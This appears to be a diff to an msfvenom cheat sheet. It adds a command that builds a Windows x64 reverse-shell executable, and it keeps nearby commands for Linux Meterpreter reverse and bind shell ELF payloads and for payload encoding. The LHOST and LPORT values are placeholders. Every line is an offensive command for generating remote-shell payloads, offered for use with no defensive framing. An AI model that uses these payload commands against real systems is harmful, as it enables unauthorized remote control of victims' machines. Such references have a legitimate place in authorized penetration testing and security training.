@@ -4,6 +4,8 @@ msfvenom -p PAYLOAD --list-options 	List payload options
 
 msfvenom -p PAYLOAD -e ENCODER -f FORMAT -i ENCODE COUNT LHOST=IP 	Payload Encoding
 
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ip LPORT=port -f exe -o reverse.exe    windows x64 architecture reverse shell .exe format
+
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf 	Linux Meterpreter reverse shell x86 multi stage
 
 msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf 	Linux Meterpreter bind shell x86 multi stage
